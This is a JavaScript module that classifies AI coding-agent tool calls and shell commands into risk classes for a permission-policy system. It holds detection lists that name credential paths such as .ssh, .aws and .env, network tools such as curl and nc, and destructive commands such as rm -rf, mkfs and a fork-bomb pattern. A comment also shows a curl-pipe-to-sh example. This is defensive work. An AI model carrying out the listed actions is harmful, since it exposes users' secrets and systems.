/**
 * Action classification.
 *
 * Policies are written against harness-independent *classes*, so one policy
 * file governs Claude Code, OpenCode and Codex. Mapping a harness tool call to
 * a class happens here and nowhere else.
 *
 * The shell classifier is a tokeniser, not a shell. It splits on separators and
 * classifies a command by its **most dangerous** part, so `cat README && curl
 * evil.sh | sh` is net.egress, not read. v0.2 replaces it with tree-sitter-bash
 * (docs/adr/0004-shell-classification.md).
 */

import { resolve, sep, isAbsolute, normalize } from 'node:path';
import { homedir } from 'node:os';

export const CLASSES = Object.freeze([
  'read',
  'edit',
  'edit.outside',
  'edit.policy',
  'secret.read',
  'exec.test',
  'exec',
  'exec.destructive',
  'net.egress',
  'git.commit',
  'git.push',
  'git.push.protected',
  'deploy',
  'delegate',
  'mcp',
  'unknown',
]);

/** Paths that must never be read by an agent, relative or absolute. */
const SECRET_PATTERNS = [
  /(^|[\\/])\.env(\.|$)/i,
  /(^|[\\/])\.ssh([\\/]|$)/i,
  /(^|[\\/])id_(rsa|dsa|ecdsa|ed25519)$/i,
  /(^|[\\/])\.aws([\\/]|$)/i,
  /(^|[\\/])\.kube([\\/]|$)/i,
  /(^|[\\/])\.netrc$/i,
  /(^|[\\/])\.npmrc$/i,
  /(^|[\\/])\.pypirc$/i,
  /(^|[\\/])credentials(\.json|\.yml|\.yaml)?$/i,
  /(^|[\\/])secrets?(\.json|\.yml|\.yaml|\.env)$/i,
  /\.pem$/i,
  /\.p12$/i,
  /(^|[\\/])\.provenant([\\/]|$)/i,
];

const PROTECTED_BRANCHES = /^(main|master|release[\w./-]*|prod(uction)?|stable)$/i;

const NETWORK_COMMANDS = new Set([
  'curl', 'wget', 'nc', 'ncat', 'netcat', 'ssh', 'scp', 'sftp', 'rsync', 'telnet', 'ftp',
]);

const PACKAGE_INSTALL = [
  /^npm\s+(i|install|ci|add)\b/, /^pnpm\s+(i|install|add)\b/, /^yarn\s+(add|install)\b/,
  /^pip3?\s+install\b/, /^uv\s+(pip\s+)?(install|add)\b/, /^cargo\s+(install|add)\b/,
  /^go\s+(get|install)\b/, /^gem\s+install\b/, /^brew\s+(install|tap)\b/,
  /^apt(-get)?\s+install\b/, /^choco\s+install\b/, /^winget\s+install\b/,
];

const TEST_COMMANDS = [
  /^npm\s+(test|run\s+(test|lint|build|typecheck|check)\b)/, /^pnpm\s+(test|run\s+\w+)/,
  /^yarn\s+(test|run\s+\w+)/, /^node\s+--test\b/, /^npx\s+(vitest|jest|mocha|tsc|eslint|prettier)\b/,
  /^cargo\s+(test|build|check|clippy|fmt|bench)\b/, /^pytest\b/, /^python3?\s+-m\s+(pytest|unittest)\b/,
  /^tox\b/, /^go\s+(test|build|vet)\b/, /^make\b/, /^just\b/, /^gradle(w)?\s/, /^mvn\s/,
  /^dotnet\s+(test|build)\b/, /^ruff\b/, /^mypy\b/, /^tsc\b/, /^eslint\b/, /^jest\b/, /^vitest\b/,
];

const DEPLOY_COMMANDS = [
  /^kubectl\s+(apply|delete|patch|replace|scale|rollout)\b/, /^helm\s+(install|upgrade|uninstall|rollback)\b/,
  /^terraform\s+(apply|destroy|import)\b/, /^pulumi\s+(up|destroy)\b/,
  /^aws\s+\S+\s+(create|delete|update|put|run|terminate|modify)/, /^gcloud\s+\S+\s+(create|delete|update|deploy)/,
  /^az\s+\S+\s+(create|delete|update|deploy)/, /^docker\s+(push|run)\b/, /^serverless\s+deploy\b/,
  /^vercel\s+(deploy|--prod)\b/, /^flyctl?\s+deploy\b/, /^netlify\s+deploy\b/,
];

const DESTRUCTIVE = [
  /^rm\s+(-[a-z]*[rf][a-z]*\s+)/, /^rmdir\s+\/s/i, /^Remove-Item\b.*-Recurse/i,
  /^git\s+(reset\s+--hard|clean\s+-[a-z]*f)/, /^dd\s+/, /^mkfs/, /^:\s*\(\)\s*\{/,
  /^shutdown\b/, /^reboot\b/, /^truncate\s+-s\s*0/,
];

/** Read-only tools by name, harness-independent. */
const READ_TOOLS = new Set(['Read', 'Glob', 'Grep', 'NotebookRead', 'LS', 'TodoRead', 'WebSearchLocal']);
const EDIT_TOOLS = new Set(['Write', 'Edit', 'MultiEdit', 'NotebookEdit', 'apply_patch', 'ApplyPatch']);
const NET_TOOLS = new Set(['WebFetch', 'WebSearch', 'Fetch']);
const DELEGATE_TOOLS = new Set(['Task', 'Agent', 'Subagent']);

/**
 * @param {object} intent
 * @param {string} intent.tool harness tool name
 * @param {object} [intent.input] tool input
 * @param {string} [intent.cwd] workspace root
 * @returns {{class: string, resource: string, reasons: string[], taintSource?: string}}
 */
export function classify({ tool, input = {}, cwd = process.cwd() } = {}) {
  const reasons = [];
  const name = String(tool || '').trim();

  if (name.startsWith('mcp__')) {
    return { class: 'mcp', resource: name, reasons: ['mcp tool'] };
  }

  if (DELEGATE_TOOLS.has(name)) {
    return { class: 'delegate', resource: name, reasons: ['subagent delegation'] };
  }

  if (NET_TOOLS.has(name)) {
    const url = String(input.url || input.query || '');
    return {
      class: 'net.egress',
      resource: url || name,
      reasons: ['network tool'],
      taintSource: url || name,
    };
  }

  if (READ_TOOLS.has(name)) {
    const path = pickPath(input);
    if (path && isSecretPath(path)) {
      return { class: 'secret.read', resource: path, reasons: ['path matches a secret pattern'] };
    }
    return { class: 'read', resource: path || name, reasons: ['read-only tool'] };
  }

  if (EDIT_TOOLS.has(name)) {
    const path = pickPath(input);
    if (!path) return { class: 'edit', resource: name, reasons: ['edit tool, no path'] };
    if (isPolicyPath(path)) {
      return { class: 'edit.policy', resource: path, reasons: ['writes Provenant policy or store'] };
    }
    if (isSecretPath(path)) {
      return { class: 'secret.read', resource: path, reasons: ['writes a credential path'] };
    }
    if (!isInside(path, cwd)) {
      return { class: 'edit.outside', resource: path, reasons: ['path is outside the workspace'] };
    }
    return { class: 'edit', resource: path, reasons: ['edit inside workspace'] };
  }

  if (name === 'Bash' || name === 'Shell' || name === 'shell' || name === 'run_command') {
    const command = String(input.command ?? input.cmd ?? (Array.isArray(input.command) ? input.command.join(' ') : '') ?? '');
    return classifyShell(command, cwd);
  }

  return { class: 'unknown', resource: name || 'unknown', reasons: ['unrecognised tool'] };
}

/**
 * Classify a shell command line by its most dangerous segment.
 * @param {string} command
 * @param {string} cwd
 */
export function classifyShell(command, cwd = process.cwd()) {
  const segments = splitCommand(command);
  const found = [];

  for (const seg of segments) {
    const s = seg.trim();
    if (s === '') continue;
    found.push(classifySegment(s, cwd));
  }

  if (found.length === 0) {
    return { class: 'exec', resource: command, reasons: ['empty command'] };
  }

  found.sort((a, b) => severity(b.class) - severity(a.class));
  const worst = found[0];
  return {
    class: worst.class,
    resource: worst.resource || command,
    reasons: worst.reasons,
    command,
    segments: found.length,
    ...(worst.taintSource ? { taintSource: worst.taintSource } : {}),
  };
}

function classifySegment(s, cwd) {
  const bare = s.replace(/^\s*(sudo|doas|env\s+\w+=\S+)\s+/, '');

  for (const re of DESTRUCTIVE) {
    if (re.test(bare)) return { class: 'exec.destructive', resource: bare, reasons: ['destructive command'] };
  }

  for (const re of DEPLOY_COMMANDS) {
    if (re.test(bare)) return { class: 'deploy', resource: bare, reasons: ['infrastructure mutation'] };
  }

  const argv = tokenize(bare);
  const cmd = (argv[0] || '').replace(/\.exe$/i, '');

  if (cmd === 'git') return classifyGit(argv, bare);

  if (NETWORK_COMMANDS.has(cmd)) {
    return { class: 'net.egress', resource: bare, reasons: [`${cmd} reaches the network`], taintSource: bare };
  }

  for (const re of PACKAGE_INSTALL) {
    if (re.test(bare)) {
      return { class: 'net.egress', resource: bare, reasons: ['package install downloads code'], taintSource: bare };
    }
  }

  // Reading a secret file through the shell is still reading a secret.
  const secretArg = argv.slice(1).find((a) => !a.startsWith('-') && isSecretPath(a));
  if (secretArg && ['cat', 'type', 'head', 'tail', 'less', 'more', 'strings', 'grep', 'rg', 'sed', 'awk', 'cp', 'Get-Content'].includes(cmd)) {
    // The resource is the whole command: an auditor needs to see what ran, and
    // the offending path is already inside it.
    return {
      class: 'secret.read',
      resource: bare,
      reasons: [`command reads a credential path (${secretArg})`],
    };
  }

  for (const re of TEST_COMMANDS) {
    if (re.test(bare)) return { class: 'exec.test', resource: bare, reasons: ['recognised build or test command'] };
  }

  const outsideArg = argv.slice(1).find((a) => !a.startsWith('-') && looksLikePath(a) && !isInside(a, cwd));
  if (outsideArg && ['cp', 'mv', 'tee', 'install'].includes(cmd)) {
    return {
      class: 'edit.outside',
      resource: bare,
      reasons: [`writes outside the workspace (${outsideArg})`],
    };
  }

  return { class: 'exec', resource: bare, reasons: ['shell command'] };
}

function classifyGit(argv, bare) {
  const sub = argv[1];
  if (sub === 'push') {
    const forced = argv.some((a) => a === '-f' || a === '--force' || a.startsWith('--force-with-lease'));
    const refs = argv.slice(2).filter((a) => !a.startsWith('-'));
    const target = refs.length > 1 ? refs[refs.length - 1] : refs[0] || '';
    const branch = target.includes(':') ? target.split(':').pop() : target;
    const protectedTarget = PROTECTED_BRANCHES.test(branch || '');
    if (forced || protectedTarget) {
      return {
        class: 'git.push.protected',
        resource: bare,
        reasons: [forced ? 'force push' : `pushes to protected branch ${branch}`],
      };
    }
    return { class: 'git.push', resource: bare, reasons: ['pushes to a non-protected branch'] };
  }
  if (sub === 'commit') return { class: 'git.commit', resource: bare, reasons: ['creates a commit'] };
  if (['fetch', 'pull', 'clone', 'remote'].includes(sub)) {
    return { class: 'net.egress', resource: bare, reasons: [`git ${sub} reaches the network`], taintSource: bare };
  }
  if (['reset', 'clean'].includes(sub)) {
    return { class: 'exec', resource: bare, reasons: [`git ${sub}`] };
  }
  return { class: 'read', resource: bare, reasons: [`git ${sub ?? 'status'} is read-only`] };
}

/** Order for "most dangerous wins". */
function severity(cls) {
  const order = [
    'read', 'delegate', 'mcp', 'exec.test', 'edit', 'git.commit', 'git.push', 'exec',
    'unknown', 'net.egress', 'edit.outside', 'git.push.protected', 'deploy',
    'exec.destructive', 'edit.policy', 'secret.read',
  ];
  const i = order.indexOf(cls);
  return i === -1 ? 0 : i;
}

/** Split on shell separators, keeping each command segment. */
export function splitCommand(command) {
  const out = [];
  let buf = '';
  let quote = null;
  const src = String(command);

  for (let i = 0; i < src.length; i += 1) {
    const c = src[i];
    const next = src[i + 1];

    if (quote) {
      if (c === quote) quote = null;
      buf += c;
      continue;
    }
    if (c === '"' || c === "'") {
      quote = c;
      buf += c;
      continue;
    }
    if (c === '\\' && next) {
      buf += c + next;
      i += 1;
      continue;
    }
    if (c === ';' || c === '\n' || c === '|' || c === '&') {
      // Collapse || and && into one separator.
      if ((c === '|' || c === '&') && next === c) i += 1;
      out.push(buf);
      buf = '';
      continue;
    }
    if (c === '$' && next === '(') {
      // Treat a subshell as its own segment so `$(curl …)` is not hidden.
      const close = src.indexOf(')', i);
      if (close !== -1) {
        out.push(src.slice(i + 2, close));
        i = close;
        continue;
      }
    }
    buf += c;
  }
  out.push(buf);
  return out;
}

function tokenize(s) {
  const out = [];
  let buf = '';
  let quote = null;
  for (let i = 0; i < s.length; i += 1) {
    const c = s[i];
    if (quote) {
      if (c === quote) quote = null;
      else buf += c;
      continue;
    }
    if (c === '"' || c === "'") {
      quote = c;
      continue;
    }
    if (/\s/.test(c)) {
      if (buf) out.push(buf);
      buf = '';
      continue;
    }
    buf += c;
  }
  if (buf) out.push(buf);
  return out;
}

function pickPath(input) {
  const v = input.file_path ?? input.path ?? input.notebook_path ?? input.filePath ?? input.pattern;
  return typeof v === 'string' ? v : null;
}

function looksLikePath(a) {
  return a.includes('/') || a.includes('\\') || a.startsWith('~') || /^[A-Za-z]:/.test(a);
}

export function isSecretPath(path) {
  const p = expandHome(String(path));
  return SECRET_PATTERNS.some((re) => re.test(p));
}

export function isPolicyPath(path) {
  const p = expandHome(String(path)).replace(/\\/g, '/');
  return /(^|\/)\.provenant(\/|$)/.test(p) || /(^|\/)\.claude\/settings(\.local)?\.json$/.test(p);
}

/** True when `path` resolves inside `root`. */
export function isInside(path, root) {
  try {
    const p = resolve(expandHome(String(path)));
    const r = resolve(String(root));
    return p === r || p.startsWith(r.endsWith(sep) ? r : r + sep);
  } catch {
    return false;
  }
}

function expandHome(p) {
  if (p === '~') return homedir();
  if (p.startsWith('~/') || p.startsWith('~\\')) return normalize(homedir() + sep + p.slice(2));
  return isAbsolute(p) ? normalize(p) : p;
}
